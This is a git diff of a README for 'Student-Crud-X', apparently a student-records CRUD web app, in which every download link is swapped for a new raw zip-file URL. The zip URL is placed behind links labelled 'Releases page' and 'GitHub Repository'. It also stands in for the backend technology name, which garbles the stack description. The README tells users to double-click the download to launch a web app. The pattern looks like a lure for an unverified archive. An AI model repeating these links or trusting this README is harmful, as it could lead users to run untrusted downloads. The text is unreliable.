@@ -1,7 +1,7 @@
 # 🎓 Student-Crud-X - Manage Student Records Effortlessly
 
 ## 🔗 Download Now
-[![Download Student-Crud-X](https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip)](https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip)
+[![Download Student-Crud-X](https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip)](https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip)
 
 ## 📖 Overview
 **Student-Crud-X** is a web application designed to help you manage student records efficiently. With this application, you can easily insert, update, view, and delete student records. It demonstrates simple CRUD (Create, Read, Update, Delete) operations and integrates a backend API for seamless data handling. The user interface is responsive, making it easy to use on any device.
@@ -20,7 +20,7 @@ To get **Student-Crud-X**, visit the Releases page to download the application f
 
 ### 1. Visit the Releases Page
 Click the link below to go to the Releases page:
-[Download Student-Crud-X](https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip)
+[Download Student-Crud-X](https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip)
 
 ### 2. Choose the Latest Release
 Once you’re on the Releases page, look for the latest version of **Student-Crud-X**. You will see a list of available assets for download.
@@ -41,10 +41,10 @@ Double-click the downloaded file to launch the application. Follow any prompts o
 - **User-Friendly Interface**: Simple and intuitive interface designed for non-technical users.
 
 ## ⚙️ How It Works
-The application utilizes a **https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip** backend to handle requests efficiently. It connects to a **MySQL** database, ensuring your data is stored securely and can be accessed quickly. The front end is built using **React**, providing a smooth user experience.
+The application utilizes a **https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip** backend to handle requests efficiently. It connects to a **MySQL** database, ensuring your data is stored securely and can be accessed quickly. The front end is built using **React**, providing a smooth user experience.
 
 ## 📊 Technology Stack
-- **Backend**: https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip
+- **Backend**: https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip
 - **Frontend**: React
 - **Database**: MySQL
 - **Languages**: HTML, CSS, JavaScript
@@ -60,7 +60,7 @@ This project covers various topics that enhance your understanding:
 - Database Management
 - Web Development with HTML, CSS, and JavaScript
 - JSON data handling
-- Using MySQL with https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip and React
+- Using MySQL with https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip and React
 - UI Design for Web Applications
 
 ## 📅 Future Updates
@@ -73,8 +73,8 @@ The **Student-Crud-X** team is dedicated to improving the application. Future up
 If you wish to contribute to **Student-Crud-X**, please follow the guidelines provided on the GitHub repository. All contributions are welcome. 
 
 ## 🔗 Important Links
-- [Visit Releases Page](https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip)
-- [GitHub Repository](https://github.com/DTH0901/Student-Crud-X/raw/refs/heads/main/public/Student_Crud_X_v1.3.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/DTH0901/Student-Crud-X/main/src/Crud-X-Student-v1.8.zip)
 
 ## 👍 Acknowledgements
 We thank everyone who contributed to the development of **Student-Crud-X**. Your support helps make this project better for everyone.
